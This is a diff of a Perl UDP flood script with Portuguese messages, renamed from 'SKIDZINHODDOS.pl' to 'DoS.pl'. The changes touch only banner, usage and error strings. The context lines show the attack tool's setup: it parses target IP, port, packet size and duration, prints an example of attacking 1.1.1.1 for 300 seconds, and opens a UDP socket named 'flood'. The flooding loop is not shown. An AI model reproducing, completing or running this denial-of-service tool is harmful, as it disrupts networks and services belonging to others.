@@ -10,21 +10,21 @@ use Socket;
 use strict;
 
 print '
-ATENÇÃO: NÃO ME RESPONSABILIZO POR ESSA MERDA!
+DoS
 ';
 print "\n";
 
  
 if ($#ARGV != 3) {
   print "\n\t\t\t***ARGUMENTOS INVALIDOS***\n";
-  print "-Ex) perl SKIDZINHODDOS.pl [IP] [PORT] [PACOTES] [SEGUNDOS]\n";
+  print "-Ex) perl DoS.pl [IP] [PORT] [PACOTES] [SEGUNDOS]\n";
   print "-Atacando o IP '1.1.1.1' por '300' segundos no port '80' usando '1000' pacotes\n\n";
   exit(1);
 }
 
 my ($ip,$port,$size,$time) = @ARGV;
 my ($iaddr,$endtime,$psize,$pport);
-$iaddr = inet_aton("$ip") or die "Não consigo conectar ao IP $ip\n";
+$iaddr = inet_aton("$ip") or die "ok, nao deu $ip\n";
 $endtime = time() + ($time ? $time : 1000000);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 print "~Para cancelar, aperte \'Ctrl-C\'\n\n";
